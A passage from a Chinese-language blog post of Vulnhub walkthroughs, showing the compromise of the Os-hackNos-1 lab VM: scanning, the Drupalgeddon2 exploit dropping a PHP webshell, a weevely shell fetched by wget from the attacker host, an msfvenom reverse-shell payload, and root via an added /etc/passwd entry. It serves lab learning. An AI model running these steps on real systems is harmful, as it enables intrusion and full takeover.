<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/04.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/05.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/06.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/07.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/08.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/09.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/10.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/11.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/12.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/13.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/14.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/15.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/16.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/00.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/01.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/02.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/03.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/04.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/05.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/06.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/07.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/08.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/09.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/00.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/01.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/02.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/03.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/04.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/05.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/06.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/07.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/08.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/09.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/10.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/11.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/12.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/13.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/14.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/15.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/16.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/17.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/18.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/CengBox/img/19.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/TenderFoot-1/img/00.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/TenderFoot-1/img/01.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/TenderFoot-1/img/02.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/TenderFoot-1/img/03.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/TenderFoot-1/img/04.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/TenderFoot-1/img/05.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/TenderFoot-1/img/06.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/TenderFoot-1/img/07.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/TenderFoot-1/img/08.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/TenderFoot-1/img/09.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/TenderFoot-1/img/10.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/TenderFoot-1/img/11.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/TenderFoot-1/img/12.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/TenderFoot-1/img/13.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/TenderFoot-1/img/14.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/TenderFoot-1/img/15.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/00.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/01.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/02.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/03.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/04.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/05.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/06.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/07.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/08.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/09.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/10.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/11.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/12.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/13.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/14.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/15.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/16.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/17.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/18.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Symfonos2/img/19.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/00.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/01.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/02.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/03.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/04.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/05.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/06.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/07.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/08.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/09.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/10.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/11.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/12.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/13.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/14.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/15.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/16.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/FishyMail/img/17.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/00.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/01.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/02.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/03.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/Hemisphere_Lynx/img/04.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/ColddBox_Easy/img/00.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/ColddBox_Easy/img/01.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/ColddBox_Easy/img/02.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/ColddBox_Easy/img/03.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/ColddBox_Easy/img/04.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/ColddBox_Easy/img/05.png">
<meta property="og:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/ColddBox_Easy/img/07.png">
<meta property="article:published_time" content="2023-02-08T13:05:32.000Z">
<meta property="article:modified_time" content="2023-03-02T16:44:13.987Z">
<meta property="article:author" content="xXxYOLOxXx">
<meta property="article:tag" content="Pentest">
<meta property="article:tag" content="Vulnhub">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://yoloyolo.top/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/00.png">

<link rel="canonical" href="https://yoloyolo.top/2023/02/08/Vulnhub-Walkthrough-Set/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>Vulnhub_Walkthrough_Set | xXxYOLOxXx</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="xXxYOLOxXx" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">xXxYOLOxXx</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">xXxYOLOxXx</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="links fa-fw"></i>Links</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://yoloyolo.top/2023/02/08/Vulnhub-Walkthrough-Set/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="xXxYOLOxXx">
      <meta itemprop="description" content="Explorer for unknown.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xXxYOLOxXx">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Vulnhub_Walkthrough_Set
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-08 08:05:32" itemprop="dateCreated datePublished" datetime="2023-02-08T08:05:32-05:00">2023-02-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-02 11:44:13" itemprop="dateModified" datetime="2023-03-02T11:44:13-05:00">2023-03-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>迟来的文章</p>
<a id="more"></a>
<h1 id="os-hacknos-1"><a class="markdownIt-Anchor" href="#os-hacknos-1"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401/">Os-hackNos-1</a></h1>
<p><code>2019/11/30 22:06:46</code></p>
<h2 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h2>
<p><code>nmap -sV -Pn -v -T5 -A 192.168.56.104</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)</span><br><span class="line">|   256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)</span><br><span class="line">|_  256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS GET HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (99%), DD-WRT v24-sp2 (Linux 2.4.37) (98%), Linux 3.2 (98%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (96%), Linux 4.4 (96%), Microsoft Windows XP SP3 (96%), BlueArc Titan 2100 NAS device (91%)</span><br></pre></td></tr></table></figure>
<h2 id="web路径枚举"><a class="markdownIt-Anchor" href="#web路径枚举"></a> Web路径枚举</h2>
<p><code>dirb http://192.168.56.104 -w</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.56.104&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;                                                               </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;index.html (CODE:200|SIZE:11321)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;server-status (CODE:403|SIZE:279)                                                  </span><br><span class="line">                                                                                                           </span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;includes&#x2F;                                                      </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;index.php (CODE:200|SIZE:7687)                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;misc&#x2F;                                                          </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;modules&#x2F;                                                       </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;profiles&#x2F;                                                      </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;robots.txt (CODE:200|SIZE:2189)                                             </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;scripts&#x2F;                                                       </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;sites&#x2F;                                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;themes&#x2F;                                                        </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;web.config (CODE:200|SIZE:2200)                                             </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;xmlrpc.php (CODE:200|SIZE:42)</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2>
<p>Web服务采用了Drupal框架</p>
<p>搜索得知Drupal框架存在RCE漏洞<br />
<code>git clone https://github.com/dreadlocked/Drupalgeddon2.git</code></p>
<p>尝试对目标使用Exploit<br />
<code>ruby drupalgeddon2.rb http://192.168.56.104/drupal/</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Testing: Writing To Web Root   (.&#x2F;)</span><br><span class="line">[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php</span><br><span class="line">[+] Result : &lt;?php if( isset( $_REQUEST[&#39;c&#39;] ) ) &#123; system( $_REQUEST[&#39;c&#39;] . &#39; 2&gt;&amp;1&#39; ); &#125;</span><br><span class="line">[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">[i] Fake PHP shell:   curl &#39;http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;shell.php&#39; -d &#39;c&#x3D;hostname&#39;</span><br><span class="line">hackNos&gt;&gt; id</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure>
<p>成功获取WebShell</p>
<h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2>
<p>查看服务器系统版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux hackNos 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>
<p>使用weevely编写WebShell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass wee.php</span><br><span class="line">mv wee.php wee</span><br></pre></td></tr></table></figure>
<p>在服务器上用wget下载WebShell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.102&#x2F;wee</span><br><span class="line">mv wee wee.php</span><br></pre></td></tr></table></figure>
<p>连接WebShell<br />
<code>weevely http://192.168.56.104/drupal/wee.php pass</code></p>
<p>使用MSFVenom编写后门<br />
<code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=1234 -f elf &gt; msf.elf</code></p>
<p>在服务器上用WebShell上传后门程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_upload &#x2F;root&#x2F;software&#x2F;msf.elf &#x2F;var&#x2F;www&#x2F;html&#x2F;drupal&#x2F;msf.elf</span><br><span class="line">ls -l msf.elf</span><br><span class="line">    -rw-r--r--  1 www-data www-data    250 Dec  2 18:37 msf.elf</span><br><span class="line">chmod 755 msf.elf</span><br><span class="line">    -rwxr-xr-x  1 www-data www-data    250 Dec  2 18:37 msf.elf</span><br><span class="line">hackNos: .&#x2F;msf.elf &amp;</span><br></pre></td></tr></table></figure>
<p>使用MSF进行渗透攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.56.102</span><br><span class="line">set LPORT 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>将meterpreter shell转为bash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
<p>查看具有suid权限且属于root用户的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper           </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign                          </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic              </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device                     </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine                           </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1            </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgidmap                                    </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd                                      </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newuidmap                                    </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;wget                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn                                         </span><br><span class="line">&#x2F;bin&#x2F;ping6                                            </span><br><span class="line">&#x2F;bin&#x2F;umount                                           </span><br><span class="line">&#x2F;bin&#x2F;ntfs-3g                                          </span><br><span class="line">&#x2F;bin&#x2F;mount                                            </span><br><span class="line">&#x2F;bin&#x2F;ping                                             </span><br><span class="line">&#x2F;bin&#x2F;su                                               </span><br><span class="line">&#x2F;bin&#x2F;fusermount                                       </span><br></pre></td></tr></table></figure>
<p>可以用wget命令提权</p>
<p>对/etc/passwd文件进行间接修改</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hackNos: file_download &#x2F;etc&#x2F;passwd passwd</span><br><span class="line">perl -le &#39;print crypt(&quot;happy_hacker&quot;,&quot;addedsalt&quot;)&#39;</span><br><span class="line">    ad3sa&#x2F;MFODb7k</span><br><span class="line">echo &#39;test:ad3sa&#x2F;MFODb7k:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwd</span><br><span class="line">hackNos: wget http:&#x2F;&#x2F;192.168.56.102&#x2F;passwd -O &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p>在bash中切换账户</p>
